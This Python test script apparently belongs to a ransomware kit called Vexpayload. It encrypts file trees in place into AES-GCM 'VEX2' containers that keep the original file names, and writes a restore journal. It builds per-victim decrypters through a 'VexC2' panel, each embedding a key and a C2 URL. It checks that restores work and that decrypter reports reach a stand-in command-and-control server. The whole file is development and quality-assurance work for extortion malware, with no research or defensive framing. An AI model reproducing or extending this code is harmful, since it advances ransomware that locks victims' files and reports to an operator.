#!/usr/bin/env python3
"""End-to-end test for Decrypter 6.x with same-name containers.

Encrypts real trees with the payload harness, builds the decrypter through the
panel builder, restores and compares SHA256. Requires MSVC + payload binary.
"""

import base64
import hashlib
import os
import re
import shutil
import struct
import subprocess
import zlib
import sys
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import unquote

from Crypto.Cipher import AES

ROOT = r"D:\Vexpayload"
PAYLOAD = os.path.join(ROOT, "x64", "Release", "Vexpayload.exe")
TEMPLATE = os.path.join(ROOT, "VexC2", "decrypter_template.cpp")
BASE = tempfile.mkdtemp(prefix="vex_dec_selftest_")
os.environ["VEX_BUILD_CACHE"] = os.path.join(BASE, "cache")
sys.path.insert(0, os.path.join(ROOT, "VexC2"))
import decrypter_build  # noqa: E402

CHECKS = []
REPORTS = []


def ok(name, cond, extra=""):
    CHECKS.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name + ((" " + str(extra)) if extra else ""))


class ReportHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        REPORTS.append((self.path, self.rfile.read(n)))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, *a):
        pass


def make_tree(path, files):
    os.makedirs(path, exist_ok=True)
    out = []
    for rel, data in files.items():
        p = os.path.join(path, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "wb") as f:
            f.write(data)
        out.append(p)
    return out


def hashes(paths):
    return {p: hashlib.sha256(open(p, "rb").read()).hexdigest() for p in paths}


def esc(p):
    return p.replace("\\", "\\\\").replace("|", "\\|")


def is_container(path):
    try:
        with open(path, "rb") as f:
            return f.read(4) == b"VEX2"
    except OSError:
        return False


def _esc(p):
    return p.replace("\\", "\\\\").replace("|", "\\|")


def _crc32(data: bytes) -> int:
    return zlib.crc32(data) & 0xFFFFFFFF


def _v2(plain: bytes, key: bytes, chunk: int = 65536) -> bytes:
    chunks = [plain[i:i + chunk] for i in range(0, len(plain), chunk)]
    out = bytearray(struct.pack("<4sIQIIQ", b"VEX2", 0, len(plain), 1, chunk,
                                len(chunks)))
    for ch in chunks:
        nonce = os.urandom(12)
        c = AES.new(key, AES.MODE_GCM, nonce=nonce)
        ct, tag = c.encrypt_and_digest(ch)
        out += bytes([1]) + struct.pack("<I", len(ch)) + nonce + ct + tag
    return bytes(out)


def _filetime(ns):
    return int(ns // 100) + 116444736000000000


def encrypt(tree, version=3, key=None):
    """Encrypt in place with Python and write a journal-v3 file.

    This keeps the decrypter suite independent of the payload binary: nothing
    compiled from Vexpayload.cpp is executed on the operator's host.
    """
    key = key or os.urandom(32)
    jl = tree + ".jnl"
    records = []
    for dirpath, _dirs, files in os.walk(tree):
        for name in files:
            path = os.path.join(dirpath, name)
            with open(path, "rb") as f:
                plain = f.read()
            sha = hashlib.sha256(plain).digest()
            st = os.stat(path)
            with open(path, "wb") as f:
                f.write(_v2(plain, key))
            records.append((sha, len(plain), path, _filetime(st.st_ctime_ns),
                            _filetime(st.st_atime_ns), _filetime(st.st_mtime_ns)))

    with open(jl, "wb") as f:
        f.write(b"VXJ2" + struct.pack("<II", version, 0))
        for sha, size, path, ct, at, wt in records:
            orig = _esc(path).encode("utf-8")
            enc = orig
            body = (struct.pack("<QQQ", ct, at, wt) if version >= 3 else b"")
            body += sha + struct.pack("<Q", size)
            body += struct.pack("<I", len(orig))
            body += orig + struct.pack("<I", len(enc)) + enc
            f.write(struct.pack("<II", len(body), _crc32(body)))
            f.write(body)
    return jl, base64.b64encode(key).decode()


def run_dec(exe, args, timeout=300):
    return subprocess.run([exe, "--no-elevate", "--no-pause"] + args,
                          capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=timeout)


hook = ThreadingHTTPServer(("127.0.0.1", 0), ReportHandler)
threading.Thread(target=hook.serve_forever, daemon=True).start()
c2_url = f"http://127.0.0.1:{hook.server_port}"

# ---------------------------------------------------------------- round trip
tree1 = os.path.join(BASE, "t1")
orig1 = make_tree(tree1, {
    "alpha.txt": b"alpha " * 500,
    "beta.bin": os.urandom(400_000),
    "nested/deep/note.txt": b"nested\n",
    "empty.dat": b"",
})
before1 = hashes(orig1)
jl1, key1 = encrypt(tree1)

ok("same names kept", all(os.path.exists(p) for p in orig1) and
   not any(p.endswith(".l0cked") for p in os.listdir(tree1)))
ok("files are containers", all(is_container(p) for p in orig1))
def journal_records(path):
    data = open(path, "rb").read()
    if data[:4] != b"VXJ2":
        return -1
    off, n = 12, 0
    while off + 8 <= len(data):
        ln, crc = struct.unpack_from("<II", data, off)
        off += 8
        if ln == 0 or off + ln > len(data):
            break
        n += 1
        off += ln
    return n

ok("journal written", os.path.exists(jl1) and journal_records(jl1) == len(orig1))

exe1 = decrypter_build.build(TEMPLATE, key1, "testvid-1", c2_url)
ok("decrypter built", bool(exe1) and os.path.getsize(exe1) > 64 * 1024)
r = run_dec(exe1, ["--selftest"])
ok("crypto self-test", r.returncode == 0 and "self-test passed" in r.stdout)

r = run_dec(exe1, ["--journal", jl1, "--key", key1, "--quiet"])
ok("restore exit 0", r.returncode == 0, r.stdout[-300:] + r.stderr[-300:])
after1 = {p: hashlib.sha256(open(p, "rb").read()).hexdigest() for p in orig1}
ok("all files byte-identical", after1 == before1)
ok("journal removed", not os.path.exists(jl1))
ok("report reached c2", any(b"kind=decrypter" in body for _, body in REPORTS))
decoded = [unquote(body.decode("utf-8", "replace")) for _, body in REPORTS]
ok("summary reported", any("ok=" in d for d in decoded), decoded[-1:] if decoded else "")

# ---------------------------------------------------------------- resume
tree2 = os.path.join(BASE, "t2")
orig2 = make_tree(tree2, {"a.txt": b"resume-a", "b.txt": b"resume-b", "c.txt": b"resume-c"})
before2 = hashes(orig2)
jl2, key2 = encrypt(tree2)
exe2 = decrypter_build.build(TEMPLATE, key2, "testvid-2", c2_url)
r1 = run_dec(exe2, ["--journal", jl2, "--key", key2, "--quiet", "--only", "a.txt"])
ok("partial restore ok", r1.returncode == 0 and
   hashlib.sha256(open(orig2[0], "rb").read()).hexdigest() == before2[orig2[0]])
ok("journal kept after partial", os.path.exists(jl2))
r2 = run_dec(exe2, ["--journal", jl2, "--key", key2, "--quiet"])
ok("resume run ok", r2.returncode == 0, r2.stdout[-300:])
ok("resume skipped done file", re.search(r"skipped:\s+[1-9]", r2.stdout) is not None, r2.stdout[-300:])
after2 = {p: hashlib.sha256(open(p, "rb").read()).hexdigest() for p in orig2}
ok("resume byte-identical", after2 == before2)

# ---------------------------------------------------------------- check mode
tree3 = os.path.join(BASE, "t3")
orig3 = make_tree(tree3, {"x.bin": os.urandom(70_000), "y.txt": b"check me"})
jl3, key3 = encrypt(tree3)
exe3 = decrypter_build.build(TEMPLATE, key3, "testvid-3", c2_url)
r = run_dec(exe3, ["--journal", jl3, "--key", key3, "--quiet", "--check"])
ok("check exit 0", r.returncode == 0, r.stdout[-200:])
ok("check left containers", all(is_container(p) for p in orig3))
ok("check kept journal", os.path.exists(jl3))
ok("check reports bytes=0", re.search(r"bytes:\s+0", r.stdout) is not None, r.stdout[-200:])

# ---------------------------------------------------------------- list
r = run_dec(exe3, ["--journal", jl3, "--key", key3, "--quiet", "--list"])
ok("list shows entries", "alpha" not in r.stdout and os.path.basename(orig3[0]) in r.stdout
   and r.returncode == 0, r.stdout[-300:])

# ---------------------------------------------------------------- filters
r = run_dec(exe3, ["--journal", jl3, "--key", key3, "--quiet",
                   "--only", "y.txt", "--exclude", ".md"])
ok("filtered run ok", r.returncode == 0 and os.path.exists(jl3), r.stdout[-200:])
ok("filtered restored only target",
   not is_container(orig3[1]) and is_container(orig3[0]))
run_dec(exe3, ["--journal", jl3, "--key", key3, "--quiet"])
ok("final restore all", all(not is_container(p) for p in orig3))

# ------------------------------------------------ small chunk_size container
# Regression: GcmDecryptChunk used to claim CHUNK_MAX regardless of the real
# output allocation. A container with chunk_size < CHUNK_MAX must still work.
tree5 = os.path.join(BASE, "t5")
os.makedirs(tree5)
plain5 = bytes(range(256)) * 16  # 4096 bytes
nonce5 = os.urandom(12)
c5 = AES.new(bytes(range(32)), AES.MODE_GCM, nonce=nonce5)
ct5, tag5 = c5.encrypt_and_digest(plain5)
blob5 = (struct.pack("<4sIQIIQ", b"VEX2", 0, len(plain5), 1, 4096, 1)
         + bytes([1]) + struct.pack("<I", len(plain5))
         + nonce5 + ct5 + tag5)
file5 = os.path.join(tree5, "smallchunk.bin")
open(file5, "wb").write(blob5)
jl5 = tree5 + ".jnl"
open(jl5, "w", encoding="utf-8").write(esc(file5) + "|" + esc(file5) + "\n")
exe5 = decrypter_build.build(TEMPLATE, base64.b64encode(bytes(range(32))).decode(),
                             "testvid-5", c2_url)
r = run_dec(exe5, ["--journal", jl5, "--key", base64.b64encode(bytes(range(32))).decode(),
                   "--quiet"])
ok("small chunk_size restores", r.returncode == 0 and open(file5, "rb").read() == plain5,
   r.stdout[-200:])
ok("small chunk journal removed", not os.path.exists(jl5))

# ------------------------------------------------ journal v2 compatibility
tree9 = os.path.join(BASE, "tree9")
os.makedirs(tree9, exist_ok=True)
p9 = os.path.join(tree9, "old.txt")
with open(p9, "wb") as f:
    f.write(b"old journal format")
jl9, key9 = encrypt(tree9, version=2)
r = run_dec(exe1, ["--journal", jl9, "--key", key9, "--quiet"])
ok("journal v2 still restores", r.returncode == 0
   and open(p9, "rb").read() == b"old journal format")

# ------------------------------------------------ multi-journal merge
ta = os.path.join(BASE, "merge_a"); tb = os.path.join(BASE, "merge_b")
for tdir, payload in ((ta, b"alpha merge"), (tb, b"beta merge")):
    os.makedirs(tdir, exist_ok=True)
    with open(os.path.join(tdir, "f.txt"), "wb") as f:
        f.write(payload)
shared = os.urandom(32)
jla, _ = encrypt(ta, key=shared)
jlb, _ = encrypt(tb, version=2, key=shared)
r = run_dec(exe1, ["--journal", jla, "--journal", jlb,
                   "--key", base64.b64encode(shared).decode(), "--quiet"])
ok("multi-journal restores both",
   r.returncode == 0
   and open(os.path.join(ta, "f.txt"), "rb").read() == b"alpha merge"
   and open(os.path.join(tb, "f.txt"), "rb").read() == b"beta merge"
   and not os.path.exists(jla) and not os.path.exists(jlb))

# ------------------------------------------------ hex key and x86 build
tree7 = os.path.join(BASE, "tree7")
os.makedirs(tree7, exist_ok=True)
p7 = os.path.join(tree7, "hex.txt")
with open(p7, "wb") as f:
    f.write(b"hex key path")
jl7, key7 = encrypt(tree7)
hex_key = base64.b64decode(key7).hex()
r = run_dec(exe1, ["--journal", jl7, "--key", hex_key, "--quiet"])
ok("hex key accepted", r.returncode == 0
   and open(p7, "rb").read() == b"hex key path")

exe86 = decrypter_build.build(TEMPLATE, base64.b64encode(bytes(range(32))).decode(),
                              "testvid-x86", "", "x86")
ok("x86 decrypter built", bool(exe86) and os.path.getsize(exe86) > 64 * 1024)
if exe86:
    r = run_dec(exe86, ["--selftest"])
    ok("x86 crypto self-test", r.returncode == 0 and "self-test passed" in r.stdout)
    tree8 = os.path.join(BASE, "tree8")
    os.makedirs(tree8, exist_ok=True)
    p8 = os.path.join(tree8, "x86.txt")
    with open(p8, "wb") as f:
        f.write(b"32-bit restore")
    jl8, key8 = encrypt(tree8)
    r = run_dec(exe86, ["--journal", jl8, "--key", key8, "--quiet"])
    ok("x86 restore", r.returncode == 0 and open(p8, "rb").read() == b"32-bit restore")

# ------------------------------------------------ v3 timestamps restored
tree6 = os.path.join(BASE, "tree6")
os.makedirs(tree6, exist_ok=True)
p6 = os.path.join(tree6, "dated.txt")
with open(p6, "wb") as f:
    f.write(b"timestamp me" * 100)
fixed = 1700000000_000000000
os.utime(p6, ns=(fixed, fixed))
before_m = os.stat(p6).st_mtime_ns
jl6, key6 = encrypt(tree6)
r = run_dec(exe1, ["--journal", jl6, "--key", key6, "--quiet"])
after_m = os.stat(p6).st_mtime_ns
ok("v3 timestamps restored", r.returncode == 0 and abs(after_m - before_m) < 1_000_000_000,
   f"{before_m}->{after_m}")

# ------------------------------------------------ all-skipped run cleans journal
# Regression: second run with every entry already in .done (ok=0, skipped=N)
# must still delete the journal.
jl1b = jl1
with open(jl1b, "w", encoding="utf-8") as f:
    for p in orig1:
        f.write(f"{esc(p)}|{esc(p)}\n")
with open(jl1b + ".done", "w", encoding="utf-8") as f:
    for p in orig1:
        f.write(base64.b64encode(p.encode("utf-8")).decode() + "\n")
before_skip = hashes(orig1)
r = run_dec(exe1, ["--journal", jl1b, "--key", key1, "--quiet"])
ok("all-skipped run exit 0", r.returncode == 0, r.stdout[-200:])
ok("all-skipped removes journal", not os.path.exists(jl1b) and
   not os.path.exists(jl1b + ".done"), r.stdout[-200:])
ok("all-skipped leaves files intact", hashes(orig1) == before_skip)

hook.shutdown()
bad = [n for n, s in CHECKS if not s]
print(f"\n{len(CHECKS) - len(bad)}/{len(CHECKS)} checks passed")
shutil.rmtree(BASE, ignore_errors=True)
sys.exit(1 if bad else 0)
